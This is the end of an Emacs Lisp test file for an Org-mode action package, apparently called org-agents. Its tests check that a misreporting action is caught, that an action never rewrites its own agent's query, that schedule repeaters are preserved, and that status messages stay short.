it in a state the report did not claim (refused outright now), and
`org-todo' fails SILENTLY when `org-blocker-hook' blocks -- a `message'
and a `throw', with no signal -- so a blocked row would be reported
`applied' whatever care went into the verb.

Mutation that must fail it: report `applied' without re-reading the entry."
  (unwind-protect
      (progn
        (defun org-agents-action/liar! (phase name)
          "Plan one value and write another."
          (pcase phase
            ('plan (cons (org-entry-get nil name) "planned"))
            ('apply (org-entry-put nil name "something else"))))
        (org-agents-test--at-agent "liar!(P)"
          (let ((said nil))
            (cl-letf (((symbol-function 'message)
                       (lambda (format &rest args)
                         (setq said (apply #'format format args)))))
              (org-agents-test--answering-yes (org-agents-apply-actions)))
            (let ((lines (org-agents-test--action-edit-lines)))
              (should (= 2 (length lines)))
              (should (string-match-p "APPLIED DIFFERENTLY" (nth 0 lines)))
              (should (string-match-p "something else" (nth 0 lines)))
              (should (string-match-p "planned" (nth 0 lines)))
              (should (string-match-p "  not attempted\\'" (nth 1 lines))))
            (should (string-match-p "failed 1" said)))
          ;; Stopped means stopped: the second entry is untouched.
          (should-not (org-agents-test--action-property a "Fix gadget" "P"))))
    (fmakunbound 'org-agents-action/liar!)))

(ert-deftest org-agents-test-action-explicit-set-never-edits-the-agent ()
  "On the region path too, an action never edits its own agent or an alias.
The ordinary path gets that free from `org-agents--collect'; the explicit
one does not go through it.  MEASURED: an agent whose body held a link to
itself, with that line in the region, applied
`set-property!(AGENT_QUERY, hijacked)' to its own drawer -- rewriting the
query the next run would read.  A rendered view is full of links and a
region is a hand-made selection, so the one entry that must not be
touched is the one most easily selected by accident.  Skipped and
REPORTED, not dropped.

Mutation that must fail it: take the region's targets without checking
them."
  (org-agents-test--at-agent "set-property!(REVIEWED, today)"
    (goto-char (point-min))
    (should (re-search-forward "^:END:$" nil t))
    (forward-line 1)
    (insert (format "- [[file:%s::*Review agent][the agent itself]]\n"
                    agent-file))
    (goto-char (point-min))
    (push-mark (save-excursion
                 (should (re-search-forward "the agent itself" nil t))
                 (line-end-position))
               t t)
    (org-agents-test--answering-yes (org-agents-apply-actions t))
    (should (cl-find-if
             (lambda (line)
               (string-match-p "skipped: this is the agent itself" line))
             (org-agents-test--action-report-lines)))
    (should (equal "(and (todo) (property \"NEXT_REVIEW\"))"
                   (org-agents-test--action-property agent-file "Review agent"
                                                     "AGENT_QUERY")))
    (should-not (org-agents-test--action-property agent-file "Review agent"
                                                  "REVIEWED"))))

(ert-deftest org-agents-test-action-scheduled-keeps-a-repeater-in-the-plan ()
  "A repeater already on the entry is part of what `scheduled!' plans.
MEASURED: `org--deadline-or-schedule' lifts the cookie off the old stamp
and puts it back on the new one, so `scheduled!(+7d)' over
`<2020-01-01 Wed +1w>' writes `<... +1w>' -- while the plan answered a
stamp with no repeater, telling the reader it was about to be dropped.

Mutation that must fail it: plan the stamp alone."
  (org-agents-test--with-action-corpus nil
    (org-agents-test--at-match
      (end-of-line)
      (insert "\nSCHEDULED: <2020-01-01 Wed +1w>")
      (org-back-to-heading t)
      (let ((plan (org-agents-action/scheduled! 'plan "+7d")))
        (should (string-match-p " \\+1w>\\'" (cdr plan)))
        (org-agents-action/scheduled! 'apply "+7d")
        ;; What the plan said is what the entry reads.
        (should (equal (cdr plan) (org-entry-get nil "SCHEDULED")))))))

(ert-deftest org-agents-test-action-message-names-a-bounded-set-of-buffers ()
  "The closing message names some buffers and counts the rest.
MEASURED, over a three-thousand-entry corpus with the limit raised: the
message named three hundred buffers -- about four kilobytes in one
`message' call, which resizes the minibuffer to fill the frame and pushes
the counts off the visible line.  The report buffer carries the file of
every row, so the message does not have to.

Mutation that must fail it: name every buffer."
  (let ((buffers nil))
    (unwind-protect
        (progn
          (dotimes (i (+ 3 org-agents--action-named-buffers))
            (push (get-buffer-create (format " *org-agents-test-b%d*" i))
                  buffers))
          (let ((text (org-agents--action-buffer-names (nreverse buffers))))
            (should (string-match-p "and 3 more\\'" text))
            (should (= org-agents--action-named-buffers
                       (length (split-string
                                (car (split-string text " and 3 more"))
                                ", " t))))))
      (dolist (buffer buffers) (when (buffer-live-p buffer)
                                 (kill-buffer buffer))))))

(provide 'org-agents-test)
;;; org-agents-test.el ends here
